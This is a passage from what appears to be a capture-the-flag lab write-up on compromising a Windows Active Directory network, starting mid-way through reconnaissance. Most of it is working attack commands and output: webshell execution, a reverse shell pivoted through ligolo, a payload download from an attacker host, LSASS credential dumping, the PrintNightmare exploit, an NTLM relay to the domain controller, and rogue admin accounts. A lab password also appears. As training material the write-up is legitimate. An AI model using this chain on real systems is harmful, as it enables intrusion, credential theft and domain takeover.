    /img                  (Status: 301) [Size: 335] [--> http://10.200.95.31/img/]
    

The webshell responds to this URI:

    http://10.200.95.31/images/ws.php?c=whoami

And the web server is running as system:

    nt authority\system

I got some information about the system:

    http://10.200.95.31/images/ws.php?c=systeminfo
Response:

    Host Name: S-SRV01 OS Name: Microsoft Windows Server 2019 Datacenter OS Version: 10.0.17763
Then finger print AV:

    http://10.200.95.31/images/ws.php?c=powershell%20-c%20Get-MpComputerStatus

Response:

    AMEngineVersion : 1.1.18800.4 AMProductVersion : 4.18.2111.5 AMRunningMode : Normal AMServiceEnabled : True AMServiceVersion : 4.18.2111.5 AntispywareEnabled : True AntispywareSignatureAge : 906 AntispywareSignatureLastUpdated : 12/19/2021 8:25:06 AM AntispywareSignatureVersion : 1.355.510.0 AntivirusEnabled : True AntivirusSignatureAge : 906 AntivirusSignatureLastUpdated : 12/19/2021 8:25:08 AM AntivirusSignatureVersion : 1.355.510.0 BehaviorMonitorEnabled : True ComputerID : 2BBDBCD0-5284-4DC2-A485-BBF6999477D4 ComputerState : 0 DeviceControlDefaultEnforcement : N/A DeviceControlPoliciesLastUpdated : 6/12/2024 10:06:02 AM DeviceControlState : N/A FullScanAge : 4294967295 FullScanEndTime : FullScanStartTime : IoavProtectionEnabled : True IsTamperProtected : False IsVirtualMachine : True LastFullScanSource : 0 LastQuickScanSource : 2 NISEnabled : True ...

So Defender is certainly running. To get a stable reverse shell I thought to upload netcat for windows (nc64.exe), but I dont' konw why the command does not work:

    http://10.200.95.31/images/ws.php?c=nc64.exe%20-h
Returned an empty page. Probably defender is blocking the execution. Then I tried to use a simple C reverse shell that I coded, since at the moment of writing is not detected by Defender. You can get it [here](https://github.com/zinzloun/MalvasiaC). Change the server to point to the agent IP, the proceed to upload the file using the form. Then we have to configure to activate a listener in ligolo to forward the traffic to our attacker machine. In ligolo console issue the following command:

    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp

The command will start a listener to the agent on port 1234 and forward the traffic to our attacker machine (the proxy server). So on the malvasiac reverse shelle you have to set the server IP to point to the pivoting machine (the agent), in my case to 10.200.95.33

    http://10.200.95.31/images/ws.php?c=dir
       Volume in drive C has no label. Volume Serial Number is 3A33-D07B Directory of C:\web\htdocs\images 06/12/2024 02:32 PM
    . 06/12/2024 02:32 PM
    .. 06/12/2024 02:26 PM 143,583 malvasia.exe 06/12/2024 02:32 PM 45,272 nc64.exe 06/12/2024 11:57 AM 75 ws.php 3 File(s) 188,930 bytes 2 Dir(s) 14,440,493,056 bytes free 
To get a revershell directly to our attacker machine issue the following command:

    http://10.200.95.31/images/ws.php?c=malvasia.exe

Once executed a nc listener on port 4321, you should get a powershell reverse shell:

    nc -lvp 4321
    listening on [any] 4321 ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 40676
    Windows PowerShell 
    Copyright (C) Microsoft Corporation. All rights reserved.
    
    PS C:\web\htdocs\images> 
    
Since the server has RDP enabled we can create a local admin user:

    net user support Password2@ /add
    net localgroup administrators support /add
    net localgroup "Remote Desktop Users" support /add

Then we can proceed to connect to the server using Remmina. Once logged I set a Defender exclusion folder for:

    C:\users\support\music


Now that we compromised a domain machine, we can try to get in control of the DC. To do that generally involves to get at first the credentials of the domain user. The first choice would be to try to dump LSASS to try to get some hashed password (or if we are lucky enough even clear password. But as we known, probably credentials guard is in place. We can verify I using the following command in powershell (run as administrator):

    Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
    ...
    SecurityServicesConfigured                   : {0}
    SecurityServicesRunning                      : {0}
    ...
Since both 0 are returned for the settings showed above, INDEED it means that credentials guard is not enabled. Further more we can verify if we have privilege (we should since we are local admin) to dump LSASS:

    whoami /priv | findstr SeDebug
    SeDebugPrivilege                          Debug programs                                                     Enabled

At this point I decided to use the port of Mimikatz in C# [SharpKatz](https://github.com/b4rtik/SharpKatz), since it can be compiled by yourown and eventually you can modify the source code to try to evade AV. Eventually I'm more confident to make changes in C# code. For this Lab it was enough to run the compiled file from the excluded Defender folder. To download the file from our attacker machine we need to set up another listener in ligolo, to access our python webserver throught the agent. Follows the command to execute in liglolo console:

    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp

Then from S-SRV01 we can proceed to download the file:

    C:\Users\support\Music>curl -O http://10.200.95.33:8000/SharpKatz.exe

Then we can try to get lsass contents (run the command from an administrator CMD)

    C:\Users\support\Music>SharpKatz.exe --Command logonpasswords > lsass.txt
You will get the output in the lsass.txt too.

Inspecting the file content we can find a clear password for a domain user:

    ...
    [*]	  Domain   : HOLOLIVE
    [*]	  Username : watamet
    [*]	  LM       : 00000000000000000000000000000000
    [*]	  NTLM     : d8d41e6cf762a8c77776a1843d4141c9
    [*]	  SHA1     : 7701207008976fdd6c6be9991574e2480853312d
    [*]	  DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
    [*]
    
    [*]	 WDigest
    [*]	  Hostname : HOLOLIVE  
    [*]	  Username : watamet  
    [*]	  Password : [NULL]
    
    [*]	 Kerberos
    [*]	  Domain   : HOLO.LIVE  
    [*]	  Username : watamet  
    [*]	  Password : Nxxxxxxxxxxx! 
    ,,,
    
[//]: # (Nothingtoworry!)
This happens since Windows historically stored cleartext passwords in RAM, using lsass process, when an intercatvie logon session take place.
I tried to kerberosting service account users, but this time no luck:

    impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.200.95.30  'holo.live/watamet:Nothingtoworry!'
    ...
    No entry founds
So following the Lab path, that involves compromise PC-FILESRV01, I logged on this system through RDP, using the domain account that we have found before (watamet):
Let's check how privileges on the machine:

    net user watamet /domain
    ...
    Local Group Memberships
    Global Group memberships     *Domain Users

Let's check if Defender is active:

    C:\Users\watamet>powershell -c Get-MpComputerStatus
    AMEngineVersion                  : 1.1.18800.4
    AMProductVersion                 : 4.18.2111.5
    AMRunningMode                    : Normal
    AMServiceEnabled                 : True
    AMServiceVersion                 : 4.18.2111.5
    AntispywareEnabled               : True
    AntispywareSignatureAge          : 904
    AntispywareSignatureLastUpdated  : 12/23/2021 5:16:13 AM
    AntispywareSignatureVersion      : 1.355.721.0
    AntivirusEnabled                 : True
    AntivirusSignatureAge            : 904
    AntivirusSignatureLastUpdated    : 12/23/2021 5:16:15 AM
    AntivirusSignatureVersion        : 1.355.721.0
    BehaviorMonitorEnabled           : False
    ...
    RealTimeProtectionEnabled        : False
    ..

Lucky for use real time protection is not enabled, so we have the possibility to run some tools to try to escalate our privileges. I will try to use winpeas. Again we need to setup another ligolo listener to reach our python webserver:

    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp

So now visting the agent URL from PC-FILESRV01:

    http://10.200.95.33:8000

Our web server will respond. Now we can proceed to download winpeas, then we can execute it:

    C:\Users\watamet\Music>winPEASx64_ofs.exe
    This program is blocked by group policy. For more information, contact your system administrator.

Oh no! We cant. Since we are not administrators we can't modify the security policy, so we have to find another tool.    
Neither seatbelt works:

    C:\Users\watamet\Music>Seatbelt.exe
    This program is blocked by group policy. For more information, contact your system administrator.

Since powershell seems not protected by AMSI:

    PS C:\Users\watamet> "mimikatz"
    mimikatz

I decided to try with <b>PrivescCheck</b>, that works quite well. <b>Note: with Remmina you can simply copy & paste the source of the Powershell script in a new textual file on the victim machine. The change the file exstension to ps1</b>
The command below generate an HTML report:

    PS C:\Users\watamet\Music> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML"

Nothing really important emerged. THe only useful information is that the last installed KB goes back to 2020:

    KB4587735 Security Update NT AUTHORITY\SYSTEM 11/11/2020 12:00:00 AM
    KB4586793 Security Update NT AUTHORITY\SYSTEM 11/11/2020 12:00:00 AM
    ...

Then I proceed to investigate which vulnerabilities we could exploit to escalate our privilege. Actually I did not found too much, so I had a look to other writeup and it's reported that the server is vulnerable to the so-called PrinterNightmare (CVE-2021-1675). I didn't know too much about this vulnerability, since I have never had the occasion to use it, I took a break to go [deeper on the matter](https://itm4n.github.io/printnightmare-exploitation/)
First we need to check if the printer remote spool is activated:
    
    impacket-rpcdump @10.200.95.35 | grep -A 10 MS-RPRN
    Protocol: [MS-RPRN]: Print System Remote Protocol 
    Provider: spoolsv.exe 
    UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 
    Bindings: 
              ncalrpc:[LRPC-ac66309ff34dbf0966]
              ncacn_ip_tcp:10.200.95.35[49668]
     ...
As we have alredy seen, since powershell is not blocked by AMSI, I found that a [script](https://github.com/calebstewart/CVE-2021-1675) that can be used to try to exploit the vulnerabilty through powershell. Since we have an RDP session active we can just copy & paste the code to the server. Then I used the exploit to add a new user to the local admin group:

    PS C:\Users\watamet\Music> Import-Module .\cve-2021-1675.ps1
    PS C:\Users\watamet\Music> Invoke-Nightmare -NewUser "support.it" -NewPassword "Pwd1234"
    [+] created payload at C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
    [+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
    [+] added user support.it as local administrator
    [+] deleting payload from C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll

Verify if we can get a cmd shell as administrator:

    PS C:\Users\watamet\Music> runas /user:support.it cmd.exe
    Enter the password for support.it:
    Attempting to start cmd.exe as user "PC-FILESRV01\support.it" ...

A new administrator cmd window should appear. With this shell I added the created user to the remote desktop group:

    net localgroup "Remote Desktop Users" support.it /add

And I logged in PC-FILESRV01 as support.it, using Remmina.

### Compromise the DC
The next target is the domain controller. As we know we have to set up an NTML relay attack. The main problem here is that our attacker machine is not directed connected to the holo network, so we need to set up a remote relay. The others requiremnts to perform such attack are already satisfied:
- We have a compromised host with administrator privileges: PC-FILESRV01
- THe target host has not SMB packet strict sign enabled: DC-SRV01

The other server (S-SRV02) inside the network cannot be use as target since SMB is not enabled on this host. As said before, we need to forward the SMB traffic from the compromoside host (PC-FILESRV01) to our attacker machine. To accomplish the task, first I set another listener to the Ligolo agent on 10.200.95.33. This lisstener will forward all the SMB traffic from the agent (10.200.95.33) to our attacker machine, this will become clearer later:

    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp

Now we need to perform an invasive action (hoping that the blue team guys are on vacation :)), since we are going to stop all SMB related services and reboot the system, in order to free port 445. Let's proceed to perform the following commands in a CMD running as administrator:
   
    sc stop netlogon
    sc stop lanmanserver
    sc config lanmanserver start= disabled
    sc stop sessionenv
    sc stop lanmanworkstation
    sc config lanmanworkstation start= disabled

Then reboot the server. Wait a couple of minutes and connect back to the server. <b>If you use Remmina so far, since it requires Netlogon service to be active on the host, it will fail. The only tool that works is Rdesktop</b>:

    rdesktop -u support.it 10.200.95.35

Verify that SMB is off:

    netstat -an | findstr :445

Should return nothing. <b>If you find (like me) that a service is still running on port 445, probably is due to a firewall port forwarding rule left active from other user (e.g using meterpreter port forward).</b> Check it out with:

    netsh interface portproxy show all
Check the clean up section on how to delete such rules.

At this point I set a portforwarding rule in PC-FILESRV01 to forward incoming SMB traffic to the agent, according to the previous listener we set.

    netsh interface portproxy add v4tov4 listenport=445 listenaddress=10.200.95.35 connectport=445 connectaddress=10.200.95.33

So the whole SMB flow we set up is:

    Incoming SMB request to PC-FILESRV01 --> FW rules forwards the request to ligolol agent (10.200.95.33) listener (445) --> the listener forward SMB request to our attacker machine

Now on our attacker machine starts the relay listener:

    impacket-ntlmrelayx -t smb://10.200.95.30 -smb2support -socks

In a while we should recive the request:

    *] SMBD-Thread-9 (process_request_thread): Received connection from 127.0.0.1, attacking target smb://10.200.95.30
    [-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
    [*] Authenticating against smb://10.200.95.30 as HOLOLIVE/SRV-ADMIN SUCCEED
    [*] SOCKS: Adding HOLOLIVE/SRV-ADMIN@10.200.95.30(445) to active SOCKS connection. Enjoy
    ...

Now we have an active socks on port 1080 that we can exploit. To intercat with this sock we can use proxychains. Change its configuration file at the end as follows:

    cat /etc/proxychains.conf  
    ...
    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    #socks4         127.0.0.1 9050
    socks4          127.0.0.1 1080

<b>Note that on Kali 2024.2 the defaul configuration file is /etc/proxychains4.conf and you need to renamed it</b>. 
Finally we can perform the last command, to get a shell inside the Domain controller:

    proxychains impacket-smbexec -no-pass HOLOLIVE/SRV-ADMIN@10.200.95.30

    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    ...
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
    
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.95.30:445  ...  OK
    [!] Launching semi-interactive shell - Careful what you execute
    C:\Windows\system32>

Then I added a new user to the administrator group:

    net user support.it Pwd1234 /add
    net localgroup Administrators /add support.it
    net localgroup "Remote Desktop Users" /add support.it

Log in to DC through RDP and find the last flag.
    
### Clean Up
Since the lab is shared with other users, it's a good practice to restore the services we stopped and remove the port forwarding rule on PC-FILESRV01. Perform the following action in a CMD as administrator:
Delete FW rule:

    netsh interface portproxy delete v4tov4 listenport=445 listenaddress=10.200.95.35

Start the services

    sc config lanmanworkstation start= auto
    sc start lanmanworkstation
    sc start sessionenv
    sc config lanmanserver start= auto
    sc start lanmanserver
    sc start netlogon

Restart the server
